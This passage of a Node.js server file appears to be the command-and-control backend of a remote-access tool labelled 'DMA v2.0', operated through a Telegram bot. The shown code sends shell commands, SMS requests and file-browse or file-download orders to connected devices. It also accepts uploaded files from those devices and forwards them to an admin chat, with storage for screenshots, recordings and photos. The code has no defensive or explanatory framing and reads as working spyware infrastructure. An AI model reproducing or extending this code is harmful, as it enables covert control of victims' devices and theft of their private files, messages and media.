            bot.sendMessage(chatId, `💬 SMS sent`, removeKeyboard).catch(e => {});
            clearUserSession(chatId);
        }
        
        if (session?.state === 'awaiting_command' && session.deviceId) {
            const command = text.trim();
            sendCommandToDevice(session.deviceId, 'execute', { cmd: command });
            bot.sendMessage(chatId, `🖥️ Executing...`, removeKeyboard).catch(e => {});
            clearUserSession(chatId);
        }
        
        if ((session?.state === 'awaiting_browse_path' || session?.state === 'awaiting_download_path') && session.deviceId) {
            const path = text.trim();
            const command = session.state === 'awaiting_browse_path' ? 'list_files' : 'get_file';
            sendCommandToDevice(session.deviceId, command, { path });
            bot.sendMessage(chatId, `📁 ${path}`, removeKeyboard).catch(e => {});
            clearUserSession(chatId);
        }
    });
}

//=== SESSION MANAGEMENT ===//
function setUserSession(userId, data) {
    userSessions.set(userId, { ...data, timestamp: Date.now() });
}

function getUserSession(userId) {
    return userSessions.get(userId);
}

function clearUserSession(userId) {
    userSessions.delete(userId);
}

//=== API ENDPOINTS ===//
app.post('/api/upload', upload.single('file'), (req, res) => {
    try {
        const deviceId = req.headers['device-id'];
        
        if (!deviceId || !req.file) {
            return res.status(400).json({ error: 'Missing data' });
        }
        
        const fileSize = (req.file.size / 1024 / 1024).toFixed(2);
        
        if (bot) {
            bot.sendDocument(adminId, req.file.path, {
                caption: `📁 From \`${deviceId.substring(0, 8)}...\`\nType: ${req.headers['file-type'] || 'file'}\nSize: ${fileSize}MB`,
                parse_mode: 'Markdown'
            }).then(() => {
                setTimeout(() => {
                    if (fs.existsSync(req.file.path)) fs.unlinkSync(req.file.path);
                }, 60000);
            }).catch(e => {});
        }
        
        res.json({ success: true });
        
    } catch (error) {
        res.status(500).json({ error: 'Upload failed' });
    }
});

app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        devices: connectedDevices.size,
        uptime: process.uptime(),
        version: '2.0.0'
    });
});

//=== CLEANUP JOBS ===//
setInterval(() => {
    const now = Date.now();
    userSessions.forEach((s, id) => {
        if (now - s.timestamp > 10 * 60 * 1000) userSessions.delete(id);
    });
}, 5 * 60 * 1000);

setInterval(() => {
    const now = Date.now();
    const maxAge = 12 * 60 * 60 * 1000;
    
    ['uploads', 'screenshots', 'recordings', 'photos', 'temp'].forEach(dir => {
        if (fs.existsSync(dir)) {
            fs.readdirSync(dir).forEach(file => {
                const filePath = path.join(dir, file);
                try {
                    if (now - fs.statSync(filePath).mtimeMs > maxAge) {
                        fs.unlinkSync(filePath);
                    }
                } catch (e) {}
            });
        }
    });
}, 60 * 60 * 1000);

//=== START SERVER ===//
server.listen(PORT, '0.0.0.0', async () => {
    console.log('\n\x1b[36m%s\x1b[0m', '🚀 DMA v2.0');
    console.log('\x1b[36m%s\x1b[0m', '━━━━━━━━━━━━━━━━━━━━━');
    console.log(`📡 Port: ${PORT}`);
    
    let retries = 0;
    while (retries < 3) {
        try {
            bot = await startBot();
            if (bot) break;
        } catch (e) {
            retries++;
            await new Promise(r => setTimeout(r, 3000));
        }
    }
    
    console.log(`🤖 Bot: ${bot ? '✅' : '❌'}`);
    console.log('\x1b[36m%s\x1b[0m', '━━━━━━━━━━━━━━━━━━━━━\n');
});

//=== GRACEFUL SHUTDOWN ===//
process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);

function shutdown() {
    console.log('\n🛑 Shutting down...');
    if (bot) bot.stopPolling();
    wss.close();
    server.close(() => process.exit(0));
}

module.exports = { app, server, wss, connectedDevices };
